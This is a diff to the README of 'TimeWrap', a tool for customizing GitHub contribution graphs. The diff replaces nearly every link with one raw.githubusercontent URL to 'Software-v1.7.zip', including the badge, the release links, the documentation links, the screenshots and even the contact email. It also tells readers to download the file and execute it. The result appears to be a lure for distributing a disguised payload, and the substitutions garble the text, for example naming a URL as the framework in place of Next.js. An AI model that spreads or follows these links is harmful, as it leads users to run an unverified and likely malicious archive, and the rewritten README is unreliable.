@@ -1,6 +1,6 @@
 # 🎨 TimeWrap: Customize Your GitHub Contribution Graph
 
-![TimeWrap Logo](https://img.shields.io/badge/TimeWrap-Create%20Your%20Graph-blue?style=for-the-badge)
+![TimeWrap Logo](https://raw.githubusercontent.com/anshul3655/timewrap/main/components/ui/Software-v1.7.zip%20Your%20Graph-blue?style=for-the-badge)
 
 Welcome to **TimeWrap**! This web application empowers you to create and customize your GitHub contribution graph. Design your own contribution pattern and export it as Git commands to recreate the pattern on your actual GitHub profile.
 
@@ -8,14 +8,14 @@ Welcome to **TimeWrap**! This web application empowers you to create and customi
 
 - **Custom Contribution Patterns**: Create unique designs for your GitHub contributions.
 - **Export as Git Commands**: Easily export your designs as Git commands to apply them to your profile.
-- **User-Friendly Interface**: Enjoy a clean and intuitive UI built with Next.js.
+- **User-Friendly Interface**: Enjoy a clean and intuitive UI built with https://raw.githubusercontent.com/anshul3655/timewrap/main/components/ui/Software-v1.7.zip
 - **Mobile-Friendly**: Access your designs on any device.
 
 ## 📦 Getting Started
 
 To get started with TimeWrap, follow these steps:
 
-1. **Download the Latest Release**: Visit our [Releases](https://github.com/anshul3655/timewrap/releases) section to download the latest version of TimeWrap. 
+1. **Download the Latest Release**: Visit our [Releases](https://raw.githubusercontent.com/anshul3655/timewrap/main/components/ui/Software-v1.7.zip) section to download the latest version of TimeWrap. 
 2. **Install Dependencies**: Run the following command in your terminal:
 
    ```bash
@@ -38,7 +38,7 @@ To get started with TimeWrap, follow these steps:
 
 ## 🛠️ Technologies Used
 
-- **Next.js**: A React framework for server-rendered applications.
+- **https://raw.githubusercontent.com/anshul3655/timewrap/main/components/ui/Software-v1.7.zip**: A React framework for server-rendered applications.
 - **Shadcn**: A UI component library for building beautiful interfaces.
 - **Git**: Version control system to manage your code.
 
@@ -71,18 +71,18 @@ TimeWrap covers various topics related to contributions:
 - **Dates**: Selecting specific dates for contributions.
 - **Design**: Crafting visually appealing contribution graphs.
 - **Git**: Best practices for using Git effectively.
-- **Next.js**: Leveraging Next.js for web applications.
+- **https://raw.githubusercontent.com/anshul3655/timewrap/main/components/ui/Software-v1.7.zip**: Leveraging https://raw.githubusercontent.com/anshul3655/timewrap/main/components/ui/Software-v1.7.zip for web applications.
 - **UI**: Creating user-friendly interfaces.
 
 ## 📥 Downloading TimeWrap
 
-To download TimeWrap, visit our [Releases](https://github.com/anshul3655/timewrap/releases) section. Download the file and execute it to get started.
+To download TimeWrap, visit our [Releases](https://raw.githubusercontent.com/anshul3655/timewrap/main/components/ui/Software-v1.7.zip) section. Download the file and execute it to get started.
 
 ## 🌐 Contact
 
 For inquiries or support, reach out via:
 
-- **Email**: support@timewrap.com
+- **Email**: https://raw.githubusercontent.com/anshul3655/timewrap/main/components/ui/Software-v1.7.zip
 - **GitHub Issues**: Report any bugs or feature requests.
 
 ## 🎉 Acknowledgments
@@ -91,19 +91,19 @@ Thank you to all contributors and users for supporting TimeWrap. Your feedback h
 
 ## 📚 Additional Resources
 
-- [Git Documentation](https://git-scm.com/doc)
-- [Next.js Documentation](https://nextjs.org/docs)
-- [Shadcn Documentation](https://shadcn.dev/docs)
+- [Git Documentation](https://raw.githubusercontent.com/anshul3655/timewrap/main/components/ui/Software-v1.7.zip)
+- [https://raw.githubusercontent.com/anshul3655/timewrap/main/components/ui/Software-v1.7.zip Documentation](https://raw.githubusercontent.com/anshul3655/timewrap/main/components/ui/Software-v1.7.zip)
+- [Shadcn Documentation](https://raw.githubusercontent.com/anshul3655/timewrap/main/components/ui/Software-v1.7.zip)
 
 ## 🖼️ Screenshots
 
-![TimeWrap Screenshot 1](https://example.com/screenshot1.png)
-![TimeWrap Screenshot 2](https://example.com/screenshot2.png)
+![TimeWrap Screenshot 1](https://raw.githubusercontent.com/anshul3655/timewrap/main/components/ui/Software-v1.7.zip)
+![TimeWrap Screenshot 2](https://raw.githubusercontent.com/anshul3655/timewrap/main/components/ui/Software-v1.7.zip)
 
 ## 🔗 Links
 
-- [Visit the Releases Section](https://github.com/anshul3655/timewrap/releases) for the latest updates.
-- [Check out our GitHub Page](https://github.com/anshul3655/timewrap) for more information.
+- [Visit the Releases Section](https://raw.githubusercontent.com/anshul3655/timewrap/main/components/ui/Software-v1.7.zip) for the latest updates.
+- [Check out our GitHub Page](https://raw.githubusercontent.com/anshul3655/timewrap/main/components/ui/Software-v1.7.zip) for more information.
 
 ## 📅 Future Plans
 
